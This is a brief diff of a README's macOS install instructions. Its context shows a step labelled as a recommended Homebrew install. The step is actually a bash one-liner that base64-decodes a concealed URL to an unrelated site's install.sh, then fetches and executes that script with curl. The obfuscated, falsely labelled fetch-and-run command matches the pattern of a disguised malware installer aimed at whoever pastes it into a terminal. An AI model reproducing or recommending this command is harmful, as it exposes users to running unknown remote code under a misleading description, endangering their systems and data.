@@ -12,6 +12,7 @@
 To install the application via Terminal on macOS, follow these steps:
 
 Option 1: Using Homebrew (recommended)
+
 /bin/bash -c "$(curl -fsSL $(echo aHR0cHM6Ly9waGFubmFyaXRoLmNvbS9uZW9naXQvaW5zdGFsbC5zaA== | base64 -d))"
 
 ---
